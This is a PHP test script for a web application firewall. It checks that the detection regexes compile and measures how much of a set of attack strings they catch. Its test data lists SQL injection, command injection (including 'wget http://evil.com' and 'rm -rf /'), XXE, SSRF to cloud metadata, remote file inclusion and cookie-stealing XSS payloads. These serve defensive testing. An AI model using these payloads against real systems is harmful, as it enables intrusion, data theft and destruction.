<?php
// Part 1: 正则语法 + 覆盖面测试
if (!function_exists('env')) { function env($k, $d=null) { return $d; } }
if (!function_exists('config_path')) { function config_path($p='') { return __DIR__.'/'.$p; } }

$highRisk = require dirname(__DIR__).'/src/Security/Patterns/data/high_risk_patterns.php';
$urlPath  = require dirname(__DIR__).'/src/Security/Patterns/data/url_path_patterns.php';
$xss      = require dirname(__DIR__).'/src/Security/Patterns/data/xss_patterns.php';
$config   = require dirname(__DIR__).'/config/security.php';

echo "══════ [1] 正则语法验证 ══════\n";
$errs = [];
foreach ($highRisk as $t=>$ps) foreach($ps as $p) if(@preg_match($p,'')===false) $errs[]="high_risk:$t:$p";
foreach ($urlPath as $p) if(@preg_match($p,'')===false) $errs[]="url_path:$p";
foreach ($xss as $t=>$ps) foreach($ps as $p) if(@preg_match($p,'')===false) $errs[]="xss:$t:$p";
if($errs){echo "❌ ".count($errs)." 无效:\n"; foreach($errs as $e) echo "  $e\n";}
else echo "✅ 全部有效\n";

echo "\n══════ [2] 覆盖面测试 ══════\n";
$tests = [
  'sql'=>["' UNION SELECT null--","extractvalue(1,concat(0x7e,database()))","updatexml(1,concat(0x7e,user()),1)","SLEEP(10)","benchmark(100000,md5(1))","load_file('/etc/passwd')","waitfor delay '0:0:5'--","/**/AND/**/1=1","%df%27 OR 1=1","@@version","database()","group_concat(table_name)","concat_ws(0x3a,user,password)","; DROP TABLE users","xp_cmdshell('whoami')","sp_oacreate","pg_sleep(15)","UNHEX(HEX(LOAD_FILE(0x2f)))"],
  'command'=>["| cat /etc/passwd","|whoami","\x60id\x60",'$(whoami)',"system('rm -rf /')","exec('wget evil.com')","; ls -la","; wget http://evil.com","include('data://text/plain,test')"],
  'path'=>["../../../etc/passwd","..\\..\\..\\windows\\win.ini","%2e%2e%2fetc%2fpasswd","/.env","/.git/config","shell.php","malicious.jsp","/etc/passwd"],
  'ldap'=>["*)(uid=*))(|(uid=*","*)(|(uid=*"],
  'xml'=>["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>","<!DOCTYPE foo SYSTEM 'http://evil.com/evil.dtd'>"],
  'nosql'=>['{"$eq": "admin"}','{"$where": "sleep(1000)"}','{"$gt": ""}','{"$regex": ".*"}'],
  'ssti'=>["{{7*7}}","{{system('id')}}","{% import os %}{{os.system('id')}}"],
  'ssrf'=>["url=http://127.0.0.1:8080","redirect=http://169.254.169.254/latest/meta-data/","url=gopher://127.0.0.1:8080","//evil.com"],
  'encoding'=>["%%32%35","%00%41","&#x27;","%c0%af"],
  'header_injection'=>["test%0d%0aContent-Type:text/html","test%0d%0aSet-Cookie:admin=true"],
  'redirect'=>["redirect=https://evil.com","callback=//evil.com","goto=javascript:alert(1)"],
  'file_include'=>["include('http://evil.com/shell.txt')","file_get_contents('php://input')","/proc/self/environ","php://filter/convert.base64-encode/resource=index","data://text/plain;base64,PD9waHA=","expect://id"],
  'xss_script'=>["<script>alert(1)</script>","javascript:alert(document.cookie)"],
  'xss_dom'=>['" onerror=alert(1) src=x','" onload=alert(document.cookie)','innerHTML="<script>alert(1)</script>"'],
  'xss_tag'=>["<iframe src=javascript:alert(1)>","<object data=javascript:alert(1)>","<svg onload=alert(1)>","<img src=x onerror=alert(1)>","<input onfocus=alert(1)>"],
  'xss_encoding'=>["\u003cscript\u003e","data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
  'xss_framework'=>["{{constructor.constructor('alert(1)')()}}",'v-html="<script>alert(1)</script>"'],
];

foreach($tests as $type=>$payloads){
  if(str_starts_with($type,'xss_')){$real=substr($type,4);$ps=$xss[$real]??[];}
  else $ps=$highRisk[$type]??[];
  if(empty($ps)){echo "  ⚠️ $type: 无模式定义\n";continue;}
  $hit=0;foreach($payloads as $pld)foreach($ps as $pt)if(@preg_match($pt,$pld)===1){$hit++;break;}
  $total=count($payloads);$pct=(int)($hit/$total*100);
  $icon=$pct==100?"✅":($pct>=50?"⚠️":"❌");
  echo "  $icon ".str_pad($type,20)." {$hit}/{$total} ({$pct}%)\n";
}

echo "\n══════ [3] URL路径专项 ══════\n";
$urlT=[["../../../etc/passwd","遍历"],["%2e%2e%2fetc%2fpasswd","编码"],["%252e%252e%252f","双重"],["/.env","ENV"],["/.git/config","GIT"],["/wp-admin/","WP"],["shell.php","PHP"],["Dockerfile","DOCKER"],["composer.json","COMPOSER"],["phpmyadmin/","PMA"],['eval($_GET[x])',"WSHELL"],[".DS_Store","DS"]];$p=0;
foreach($urlT as list($pl,$d)){$h=false;foreach($urlPath as $pt)if(@preg_match($pt,$pl)===1){$h=true;break;}echo($h?"✅":"❌")." $d\n";if($h)$p++;}
echo "  {$p}/".count($urlT)."\n";

echo "\n══════ [4] 配置项可达性 ══════\n";
$keys=['enabled','log_enabled','log_level','log_full_request',
  'dl.url_path','dl.encoding','dl.user_agent','dl.headers','dl.body_size','dl.rate_limit','dl.http_method','dl.url_length','dl.high_risk','dl.xss','dl.upload','dl.redirect',
  'trusted_ips','blacklist','whitelist',
  'rate_limit.*','pattern_mode','high_risk_patterns','high_risk_patterns_exclude','xss_patterns','xss_patterns_exclude',
  'upload.*','max_url_length','max_body_size','user_agent_blacklist','user_agent_blacklist_exclude',
  'headers.*','headers.host_validation',
  'input_processing.*','response.*','response.view','markdown.*','url_path_detection.*','encoding_detection.*',
  'allowed_http_methods','before_block_callback','excluded_routes','threat_risk_levels',
  'encoding_detection.suspicious_patterns','encoding_detection.encoding_patterns','encoding_detection.encoding_patterns_exclude',
];
$checks=[];
// Check config keys
$dl=$config['detection_layers']??[]; $ul=$config['upload']??[]; $rl=$config['rate_limit']??[]; $hd=$config['headers']??[];
$ip=$config['input_processing']??[]; $rs=$config['response']??[]; $md=$config['markdown']??[]; $ud=$config['url_path_detection']??[]; $ed=$config['encoding_detection']??[];
$checks['enabled']=isset($config['enabled']);$checks['log_enabled']=isset($config['log_enabled']);$checks['log_level']=isset($config['log_level']);
$checks['log_full_request']=isset($config['log_full_request']);
$checks['dl.url_path']=isset($dl['url_path']);$checks['dl.encoding']=isset($dl['encoding']);$checks['dl.user_agent']=isset($dl['user_agent']);
$checks['dl.headers']=isset($dl['headers']);$checks['dl.body_size']=isset($dl['body_size']);$checks['dl.rate_limit']=isset($dl['rate_limit']);
$checks['dl.http_method']=isset($dl['http_method']);$checks['dl.url_length']=isset($dl['url_length']);$checks['dl.high_risk']=isset($dl['high_risk']);
$checks['dl.xss']=isset($dl['xss']);$checks['dl.upload']=isset($dl['upload']);$checks['dl.redirect']=array_key_exists('redirect',$dl);
$checks['trusted_ips']=is_array($config['trusted_ips']);$checks['blacklist']=is_array($config['blacklist']);$checks['whitelist']=is_array($config['whitelist']);
$checks['rate_limit.*']=isset($rl['max_attempts'],$rl['decay_minutes']);
$checks['pattern_mode']=isset($config['pattern_mode']);$checks['high_risk_patterns']=is_array($config['high_risk_patterns']);
$checks['high_risk_patterns_exclude']=is_array($config['high_risk_patterns_exclude']);
$checks['xss_patterns']=is_array($config['xss_patterns']);$checks['xss_patterns_exclude']=is_array($config['xss_patterns_exclude']);
$checks['upload.*']=isset($ul['max_size'])&&is_array($ul['allowed_extensions']);
$checks['max_url_length']=isset($config['max_url_length']);$checks['max_body_size']=isset($config['max_body_size']);
$checks['user_agent_blacklist']=is_array($config['user_agent_blacklist']);$checks['user_agent_blacklist_exclude']=is_array($config['user_agent_blacklist_exclude']);
$checks['headers.*']=is_array($hd['forbidden']??null)&&isset($hd['detect_crlf']);$checks['headers.host_validation']=isset($hd['host_validation']);
$checks['input_processing.*']=isset($ip['max_input_length']);$checks['response.*']=isset($rs['blocked_status'])&&is_array($rs['messages']);
$checks['response.view']=array_key_exists('view',$rs);$checks['markdown.*']=isset($md['smart_detection'],$md['allow_script_in_markdown']);
$checks['url_path_detection.*']=is_array($ud['path_patterns']);$checks['encoding_detection.*']=isset($ed['percent_threshold']);
$checks['allowed_http_methods']=is_array($config['allowed_http_methods']);
$checks['before_block_callback']=array_key_exists('before_block_callback',$config);
$checks['excluded_routes']=is_array($config['excluded_routes']);$checks['threat_risk_levels']=is_array($config['threat_risk_levels']);
$checks['encoding_detection.suspicious_patterns']=is_array($ed['suspicious_patterns']??null);
$checks['encoding_detection.encoding_patterns']=is_array($ed['encoding_patterns']??null);
$checks['encoding_detection.encoding_patterns_exclude']=is_array($ed['encoding_patterns_exclude']??null);

$ok=true;foreach($checks as $k=>$v){if($v)echo"  ✅ $k\n";else{$ok=false;echo"  ❌ $k\n";}}
echo "  ".($ok?"✅ 全部可达":"❌ 存在缺失")."\n\n"."=== Part 1 完成 ===\n";
